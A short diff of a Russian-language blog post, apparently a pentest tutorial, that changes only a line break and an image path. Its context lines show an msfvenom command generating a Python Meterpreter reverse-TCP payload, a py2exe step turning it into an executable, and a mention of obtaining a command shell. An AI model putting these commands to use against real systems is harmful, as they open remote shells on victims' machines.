@@ -66,6 +66,7 @@ msfvenom -p python/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > payl
 
 Делаем exe:
 <br>
+<br>
 ~~~
 python34 -m py2exe.build_exe payload.py --bundle-files 0
 ~~~
@@ -83,7 +84,7 @@ run
 
 И получаем коммандную оболочку:
 
-({{ site.baseurl }}/assets/img/posts_rus/python_shell.jpg){:class="img"}
+({{ site.baseurl }}/rus/assets/img/posts_rus/python_shell.jpg){:class="img"}
 
 # Заключение
 {:id="end"}
